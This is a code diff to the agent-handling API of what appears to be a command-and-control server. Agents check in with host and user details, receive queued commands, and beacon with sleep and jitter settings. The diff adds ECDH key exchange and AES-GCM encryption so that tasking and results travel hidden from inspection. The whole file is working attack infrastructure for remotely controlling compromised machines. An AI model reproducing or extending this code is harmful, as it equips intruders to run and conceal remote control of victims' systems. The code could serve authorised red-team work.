@@ -1,14 +1,19 @@
-from fastapi import APIRouter, Depends, HTTPException
+import base64
+import json
+from fastapi import APIRouter, Depends, HTTPException, Request
 from sqlalchemy.orm import Session
 from db.database import get_db
 from models.agent import Agent
 from models.task import Task
 from core.ws_manager import manager
+from core.ecdh_srv import perform_ecdh
 from pydantic import BaseModel
+from typing import Optional
 from datetime import datetime
 import asyncio
 
 router = APIRouter(prefix="/api/agents", tags=["agents"])
+
 
 class AgentCheckin(BaseModel):
     hostname: str
@@ -16,25 +21,101 @@ class AgentCheckin(BaseModel):
     os: str
     arch: str
     ip: str
+    pub_key: Optional[str] = None   # ECDH P-256 public key (hex, 65 bytes uncompressed)
+
 
 class TaskResult(BaseModel):
     task_id: str
     output: str
     status: str
 
+
+def _decrypt_body(raw: bytes, session_key_hex: str) -> dict:
+    """Decrypt agent request body if session key is established."""
+    if not session_key_hex:
+        return json.loads(raw)
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    try:
+        envelope = json.loads(raw)
+        if "enc" not in envelope:
+            return envelope
+        ct = bytes.fromhex(envelope["enc"])
+        key = bytes.fromhex(session_key_hex)
+        aesgcm = AESGCM(key)
+        nonce, ciphertext = ct[:12], ct[12:]
+        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
+        return json.loads(plaintext)
+    except Exception:
+        return json.loads(raw)
+
+
+def _encrypt_response(data: dict, session_key_hex: str) -> dict:
+    """Encrypt server response if session key is established."""
+    if not session_key_hex:
+        return data
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    import os as _os
+    key = bytes.fromhex(session_key_hex)
+    aesgcm = AESGCM(key)
+    nonce = _os.urandom(12)
+    plaintext = json.dumps(data).encode()
+    ct = aesgcm.encrypt(nonce, plaintext, None)
+    return {"enc": (nonce + ct).hex()}
+
+
 @router.post("/checkin")
-def agent_checkin(data: AgentCheckin, db: Session = Depends(get_db)):
+async def agent_checkin(request: Request, db: Session = Depends(get_db)):
+    raw = await request.body()
+
+    # Determine if body is encrypted (agent sends ?id=<agent_id> when key exchanged)
+    agent_id_param = request.query_params.get("id")
+    session_key_hex = ""
+    if agent_id_param:
+        existing = db.query(Agent).filter(Agent.id == agent_id_param).first()
+        if existing and existing.session_key:
+            session_key_hex = existing.session_key
+
+    try:
+        body = _decrypt_body(raw, session_key_hex)
+    except Exception:
+        raise HTTPException(status_code=400, detail="Bad request body")
+
+    data = AgentCheckin(**body)
+
     agent = db.query(Agent).filter(
         Agent.hostname == data.hostname,
         Agent.username == data.username
     ).first()
 
+    server_pub = None
+
     if not agent:
-        agent = Agent(**data.model_dump())
+        agent = Agent(
+            hostname=data.hostname,
+            username=data.username,
+            os=data.os,
+            arch=data.arch,
+            ip=data.ip,
+        )
         db.add(agent)
+        db.flush()  # get agent.id
+
+        if data.pub_key:
+            try:
+                sk_bytes, server_pub = perform_ecdh(data.pub_key)
+                agent.session_key = sk_bytes.hex()
+            except Exception:
+                pass
     else:
         agent.last_seen = datetime.utcnow()
         agent.is_active = True
+        # Re-key if agent sends new pub_key (e.g. after restart)
+        if data.pub_key and not agent.session_key:
+            try:
+                sk_bytes, server_pub = perform_ecdh(data.pub_key)
+                agent.session_key = sk_bytes.hex()
+            except Exception:
+                pass
 
     db.commit()
     db.refresh(agent)
@@ -48,15 +129,31 @@ def agent_checkin(data: AgentCheckin, db: Session = Depends(get_db)):
         pending.status = "running"
         db.commit()
 
-    return {
+    response = {
         "agent_id": agent.id,
         "sleep": agent.sleep,
         "jitter": agent.jitter,
-        "task": {"id": pending.id, "command": pending.command} if pending else None
+        "task": {"id": pending.id, "command": pending.command} if pending else None,
     }
+    if server_pub:
+        response["server_pub"] = server_pub
+
+    return _encrypt_response(response, agent.session_key if not server_pub else "")
+
 
 @router.post("/{agent_id}/result")
-async def submit_result(agent_id: str, result: TaskResult, db: Session = Depends(get_db)):
+async def submit_result(agent_id: str, request: Request, db: Session = Depends(get_db)):
+    raw = await request.body()
+
+    agent = db.query(Agent).filter(Agent.id == agent_id).first()
+    session_key_hex = agent.session_key if agent else ""
+
+    try:
+        body = _decrypt_body(raw, session_key_hex)
+        result = TaskResult(**body)
+    except Exception:
+        raise HTTPException(status_code=400, detail="Bad request body")
+
     task = db.query(Task).filter(Task.id == result.task_id).first()
     if not task:
         raise HTTPException(status_code=404, detail="Task not found")
@@ -78,13 +175,16 @@ async def submit_result(agent_id: str, result: TaskResult, db: Session = Depends
 
     return {"status": "ok"}
 
+
 @router.get("/")
 def list_agents(db: Session = Depends(get_db)):
     return db.query(Agent).all()
 
+
 @router.get("/{agent_id}/tasks")
 def get_tasks(agent_id: str, db: Session = Depends(get_db)):
     return db.query(Task).filter(Task.agent_id == agent_id).order_by(Task.created_at.desc()).all()
+
 
 @router.patch("/{agent_id}/sleep")
 def update_sleep(agent_id: str, sleep: int, jitter: int = 1, db: Session = Depends(get_db)):
@@ -126,7 +226,6 @@ def delete_agent(agent_id: str, db: Session = Depends(get_db)):
 
 @router.post("/heartbeat-check")
 def heartbeat_check(db: Session = Depends(get_db)):
-    """Mark agents as inactive if not seen in 5 minutes."""
     from datetime import timedelta
     threshold = datetime.utcnow() - timedelta(minutes=5)
     stale = db.query(Agent).filter(Agent.last_seen < threshold, Agent.is_active == True).all()
